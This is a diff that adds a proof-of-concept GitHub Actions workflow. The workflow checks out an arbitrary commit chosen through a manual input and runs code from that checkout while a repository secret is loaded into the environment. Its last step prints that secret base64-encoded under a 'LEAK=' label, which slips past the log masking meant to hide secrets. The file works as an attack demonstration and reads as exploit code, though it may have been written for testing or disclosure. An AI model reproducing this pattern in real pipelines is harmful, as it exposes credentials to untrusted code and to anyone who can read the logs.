@@ -1,0 +1,28 @@
+name: PoC Integration Tests
+on:
+  workflow_dispatch:
+    inputs:
+      pr_numbers:
+        required: false
+        type: string
+      commit_sha:
+        required: false
+        type: string
+permissions:
+  contents: read
+jobs:
+  run-tests:
+    runs-on: ubuntu-latest
+    env:
+      POC: ${{ secrets.POC_SECRET }}
+    steps:
+      - name: Check out repository
+        uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5
+        with:
+          ref: ${{ inputs.commit_sha }}
+      - name: Run tests (checked-out code executes here)
+        run: python .github/workflows/poc_exec.py
+      - name: Later privileged step holding the secret
+        run: |
+          echo "secret length=${#POC}"
+          python3 -c "import os,base64; print('LEAK='+base64.b64encode(('poc='+os.environ.get('POC','')).encode()).decode())"
